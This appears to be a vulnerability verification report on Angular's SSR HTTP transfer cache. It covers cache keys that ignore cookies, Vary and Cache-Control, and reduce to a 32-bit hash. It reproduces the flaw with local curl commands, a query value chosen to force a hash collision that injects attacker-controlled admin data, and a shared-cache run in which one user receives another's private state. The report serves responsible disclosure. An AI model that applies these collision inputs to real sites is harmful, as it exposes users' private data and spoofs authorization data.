# Independent verification

Date: 2026-04-29

Verdict: `CONFIRMED`, with scope caveats.

An independent verifier reviewed Angular source and reproduced the runtime behavior without trusting
the existing report wording.

## Source review

Confirmed:

- `packages/platform-browser/src/hydration.ts:283-285` enables `ɵwithHttpTransferCache({})` by
  default through `provideClientHydration()`, unless explicitly disabled.
- `packages/common/http/src/transfer_cache.ts:322-341` builds the transfer cache key from
  `[method, responseType, mappedRequestUrl, serializedBody, encodedParams].join('|')`.
- `packages/common/http/src/transfer_cache.ts:349-361` reduces that key through a 32-bit hash.
- `Cookie`, general request headers, credentials mode, response `Vary`, and response
  `Cache-Control: private/no-store` do not participate in cache keying or cache eligibility.
- `packages/common/http/src/transfer_cache.ts:417-424` keeps the client-side transfer cache active
  until the application becomes stable. Server-side state is per render through the request
  `TransferState` instance.

## Runtime verification: existing PoC

Command:

```bash
cd bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx server.ts
curl -sS -H 'Cookie: sid=alice' 'http://127.0.0.1:4218/?feed=uibaalzu'
```

Observed HTML:

```html
<div id="authz">feed={"user":"attacker","role":"admin","source":"feed"}|me={"user":"attacker","role":"admin","source":"feed"}|ADMIN_PANEL_SECRET</div>
<div id="hits">tenant:tenant-a|tenant:tenant-a</div>
```

Observed server log:

```text
[api] /feed hit 1 query= {"x":"uibaalzu"}
[ssr] me body: {"user":"attacker","role":"admin","source":"feed"}
[express] api hit counts profile= 0 me= 0 feed= 1 tenant= 1 collision= 1
```

`/api/me` and `/api/profile` were not called by the backend. Their responses were replayed from
other transfer-cache entries.

## Runtime verification: shared HTML cache chain

Command:

```bash
cd bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx shared_cache_private_state_server.ts
curl -sS -i -H 'Cookie: sid=alice' 'http://127.0.0.1:4221/private?case=seq1'
curl -sS -i -H 'Cookie: sid=bob' 'http://127.0.0.1:4221/private?case=seq1'
```

Bob received Alice's private SSR state:

```text
X-Proxy-Cache: HIT
```

```html
<div id="private">private:sid=alice</div>
<script id="ng-state">{"3517752801":{"b":"private:sid=alice", ...</script>
```

This confirms the chain, but it requires an outer shared cache that stores HTML without varying on
`Cookie`.

## Runtime verification: normal Angular SSR app

The verifier also built a fresh app under `/tmp/a18-normal/server.ts` using normal Angular SSR APIs:

- `bootstrapApplication()`
- `provideClientHydration()`
- `provideHttpClient(withFetch())`
- cookie-forwarding interceptor
- `/api/data` with `Vary: X-Tenant` and `Cache-Control: private, no-store`
- `/api/me` with `Vary: Cookie`
- no chosen-collision suffixes

The `/multitenant` route made two same-URL SSR requests with different `X-Tenant` headers.

Observed HTML:

```html
<div id="a">tenant:tenant-a</div>
<div id="b">tenant:tenant-a</div>
```

Observed `ng-state`:

```json
{"1951339085":{"b":"tenant:tenant-a","u":"http://127.0.0.1:4230/api/data","rt":"text"}}
```

Observed backend log:

```text
[api] /api/data hit 1 tenant= "tenant-a"
[express] /multitenant complete, /api/data backend hits= 1
```

This confirms the request-variant confusion primitive in a normal SSR app without chosen collision.

The verifier also tested `/per-user` across separate Alice and Bob renders. Each render used a new
`TransferState`, so no cross-render leak occurred without an outer shared cache.

## Severity assessment from verifier

- Base framework primitive: reportable `Medium`.
- `Vary` intra-render variant confusion: `Medium`; default config, relevant to multi-tenant, i18n,
  feature-flag, and API-versioned apps.
- 32-bit chosen collision into sensitive endpoint: `Medium-High`; requires an attacker-controlled
  URL fetched in the same render as a sensitive endpoint.
- Private/no-store body embedded into HTML/`ng-state`: `Medium`; enables shared-cache chain.
- Cross-user leak through outer shared HTML cache: `High` if the deployment condition holds, but the
  cache behavior is outside Angular.

Recommended reporting position:

- report as an Angular framework hardening/security issue;
- emphasize default-on behavior, ignored `Vary`/`Cache-Control`, and 32-bit collision-prone state
  keys;
- present high severity only as a chained impact when app/deployment conditions are satisfied.
